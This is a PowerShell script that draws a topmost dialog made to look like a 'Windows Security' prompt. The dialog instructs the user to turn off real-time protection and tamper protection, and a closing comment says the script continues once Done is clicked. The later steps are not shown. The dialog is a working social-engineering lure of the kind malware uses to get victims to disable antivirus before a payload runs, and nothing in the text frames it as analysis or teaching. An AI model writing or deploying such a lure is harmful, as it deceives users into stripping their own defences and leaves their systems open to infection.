Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$form = New-Object System.Windows.Forms.Form
$form.Text = "Windows Security"
$form.Size = New-Object System.Drawing.Size(480, 190)
$form.StartPosition = "CenterScreen"
$form.TopMost = $true
$form.FormBorderStyle = "FixedDialog"
$form.MaximizeBox = $false
$form.MinimizeBox = $false

$label = New-Object System.Windows.Forms.Label
$label.Text = "TURN OFF REALTIME PROTECTION AND TAMPER PROTECTION`n`nThen click Done."
$label.AutoSize = $false
$label.Size = New-Object System.Drawing.Size(440, 75)
$label.Location = New-Object System.Drawing.Point(20, 20)
$label.Font = New-Object System.Drawing.Font("Segoe UI", 12)
$label.TextAlign = "MiddleCenter"

$button = New-Object System.Windows.Forms.Button
$button.Text = "Done"
$button.Size = New-Object System.Drawing.Size(100, 32)
$button.Location = New-Object System.Drawing.Point(180, 105)
$button.DialogResult = [System.Windows.Forms.DialogResult]::OK

$form.Controls.Add($label)
$form.Controls.Add($button)
$form.AcceptButton = $button

$form.ShowDialog() | Out-Null
$form.Dispose()

# Script continues after Done is clicked